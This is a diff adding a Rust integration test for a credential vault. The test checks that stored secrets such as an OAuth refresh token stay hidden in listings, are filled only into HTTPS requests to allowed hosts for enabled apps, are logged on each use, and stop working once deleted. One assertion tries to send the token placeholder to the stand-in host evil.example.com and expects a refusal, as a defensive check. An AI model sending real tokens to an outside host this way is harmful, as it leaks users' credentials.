@@ -120,7 +120,8 @@ impl Vault {
         let issuer = "https://auth.test/api/auth".to_string();
         let bucket = json!({ "endpoint": "https://s3.test", "bucket": "install", "region": "auto", "key_id": "id", "secret": "bucket secret" }).to_string();
         let running = run(vec![
-            Served { name: "auth".into(), module: module("test/auth.js"), class: None, listen: format!("127.0.0.1:{auth}"), bindings: vec![] },
+            Served { name: "auth".into(), module: module("test/auth.js"), class: None, listen: format!("127.0.0.1:{auth}"), bindings: vec![], outbound: None },
+            Served { name: "sites".into(), module: module("test/sites.js"), class: None, listen: format!("127.0.0.1:{}", port()), bindings: vec![], outbound: None },
             Served {
                 name: "vault".into(),
                 module: module("vault/worker.js"),
@@ -133,6 +134,7 @@ impl Vault {
                     ("RECOVERY_KEY".into(), B64U.encode(&recovery_public)),
                     ("BUCKET".into(), bucket),
                 ],
+                outbound: Some("sites".into()),
             },
         ]);
         Vault { _running: running, url: format!("http://127.0.0.1:{vault}"), auth: format!("http://127.0.0.1:{auth}"), issuer, secret, recovery }
@@ -149,6 +151,25 @@ impl Vault {
         let agent: ureq::Agent = ureq::Agent::config_builder().build().into();
         let token = agent.post(format!("{}/sign", self.auth)).send_json(json!({ "iss": self.issuer, "sub": user, "azp": client, "client_id": client, "aud": "https://compute.test", "scope": "openid", "exp": exp })).unwrap().body_mut().read_to_string().unwrap();
         (token, exp * 1000)
+    }
+
+    /// A client of `user`'s, added with their passkey: → its access token.
+    fn client(&self, user: &str, passkey: &str, client: &str) -> String {
+        let code = format!("{client}'s authorization code for {user}");
+        assert_eq!(self.internal("grant", json!({ "user": user, "from": passkey, "to": code, "client": client })).0, 200);
+        let (token, until) = self.token(user, client);
+        assert_eq!(self.internal("rekey", json!({ "from": code, "to": format!("{client}'s refresh token for {user}"), "token": token, "until": until })).1["moved"], true);
+        token
+    }
+
+    fn ask(&self, token: &str, method: &str, path: &str, body: Value) -> (u16, Value) {
+        let agent: ureq::Agent = ureq::Agent::config_builder().http_status_as_error(false).build().into();
+        let url = format!("{}{path}", self.url);
+        let mut resp = match method {
+            "GET" => agent.get(url).header("authorization", format!("Bearer {token}")).call().unwrap(),
+            _ => agent.post(url).header("authorization", format!("Bearer {token}")).send_json(body).unwrap(),
+        };
+        (resp.status().as_u16(), resp.body_mut().read_json().unwrap())
     }
 
     /// The scope keys the recovery key opens.
@@ -289,4 +310,56 @@ fn compute_servers_get_create_only_urls_for_objects_in_scopes_they_may_use() {
 fn url_query(url: &str) -> std::collections::BTreeMap<String, String> {
     let query = url.split_once('?').unwrap().1;
     query.split('&').map(|p| p.split_once('=').unwrap()).map(|(k, v)| (k.to_string(), v.replace("%3B", ";"))).collect()
+}
+
+#[test]
+fn the_vault_fills_an_apps_requests_with_secrets_it_never_shows() {
+    let v = Vault::start();
+    v.internal("passkey", json!({ "user": ANDRE, "secret": "andre's passkey prf output" }));
+    let token = v.client(ANDRE, "andre's passkey prf output", "mac");
+    let me = format!("user:{ANDRE}");
+    let id = "0123456789abcdef";
+    let item = json!({ "id": id, "title": "Google sign-in", "type": "Google account", "hosts": ["oauth2.googleapis.com"], "apps": ["gmail"],
+        "fields": { "client_id": { "value": "the client id" }, "refresh_token": { "value": "the refresh token itself", "secret": true } } });
+    assert_eq!(v.ask(&token, "POST", "/items", json!({ "scope": me, "item": item })).0, 200);
+
+    // Listed, a secret field says only that it's secret.
+    let (_, list) = v.ask(&token, "GET", "/items", json!({}));
+    assert!(!list.to_string().contains("the refresh token itself"));
+    assert_eq!(list["items"][0]["fields"], json!({ "client_id": { "value": "the client id" }, "refresh_token": { "secret": true } }));
+
+    // Gmail's refresh goes out with it filled in, to its host, through the vault.
+    let fetch = |app: &str, url: &str, body: &str| v.ask(&token, "POST", "/fetch", json!({ "app": app, "url": url, "method": "POST", "headers": { "content-type": "text/plain" }, "body": body }));
+    let (status, sent) = fetch("gmail", "https://oauth2.googleapis.com/token", &format!("grant_type=refresh_token&refresh_token={{{{{id}:refresh_token}}}}&client_id={{{{client_id}}}}"));
+    assert_eq!(status, 200, "{sent}");
+    let echoed: Value = serde_json::from_slice(&B64U.decode(sent["body64"].as_str().unwrap().as_bytes()).unwrap()).unwrap();
+    assert_eq!(echoed["body"], "grant_type=refresh_token&refresh_token=the refresh token itself&client_id=the client id");
+    assert_eq!(echoed["url"], "https://oauth2.googleapis.com/token");
+
+    // Never to another host, never for an app it isn't switched on for, never over plain http.
+    let (status, refused) = fetch("gmail", "https://evil.example.com/", &format!("{{{{{id}:refresh_token}}}}"));
+    assert_eq!(status, 400);
+    assert!(refused["error"].as_str().unwrap().contains("sent only to oauth2.googleapis.com"));
+    let (_, other) = fetch("calendar", "https://oauth2.googleapis.com/token", &format!("{{{{{id}:refresh_token}}}}"));
+    let echoed: Value = serde_json::from_slice(&B64U.decode(other["body64"].as_str().unwrap().as_bytes()).unwrap()).unwrap();
+    assert_eq!(echoed["body"], format!("{{{{{id}:refresh_token}}}}"));
+    assert_eq!(fetch("gmail", "http://oauth2.googleapis.com/token", "x").0, 400);
+
+    // A sidecar named among an item's hosts gets its field filled into what it sends on.
+    let key = json!({ "id": "00000000000000ff", "title": "Work browser", "hosts": ["agent-computers"], "apps": ["agent-computers"], "fields": { "key": { "generate": true } } });
+    assert_eq!(v.ask(&token, "POST", "/items", json!({ "scope": me, "item": key })).0, 200);
+    let (_, filled) = v.ask(&token, "POST", "/fill", json!({ "app": "agent-computers", "host": "agent-computers", "text": "{{00000000000000ff:key}}" }));
+    assert_eq!(filled["text"].as_str().unwrap().len(), 43, "a generated key: {filled}");
+    assert_eq!(v.ask(&token, "POST", "/fill", json!({ "app": "agent-computers", "host": "shell", "text": "{{00000000000000ff:key}}" })).0, 400);
+
+    // Each use is in Andre's record.
+    let (_, record) = v.ask(&token, "GET", "/unseals", json!({}));
+    let what: Vec<String> = record["unseals"].as_array().unwrap().iter().flat_map(|u| u["what"].as_array().unwrap().iter().map(|w| w.as_str().unwrap().to_string())).collect();
+    assert!(what.contains(&format!("gmail used {id}")) && what.contains(&"agent-computers used 00000000000000ff".to_string()), "{what:?}");
+
+    // Deleted, it fills nothing.
+    assert_eq!(v.ask(&token, "POST", "/items", json!({ "scope": me, "item": { "id": id, "deleted": true } })).0, 200);
+    let (_, gone) = fetch("gmail", "https://oauth2.googleapis.com/token", &format!("{{{{{id}:refresh_token}}}}"));
+    let echoed: Value = serde_json::from_slice(&B64U.decode(gone["body64"].as_str().unwrap().as_bytes()).unwrap()).unwrap();
+    assert_eq!(echoed["body"], format!("{{{{{id}:refresh_token}}}}"));
 }
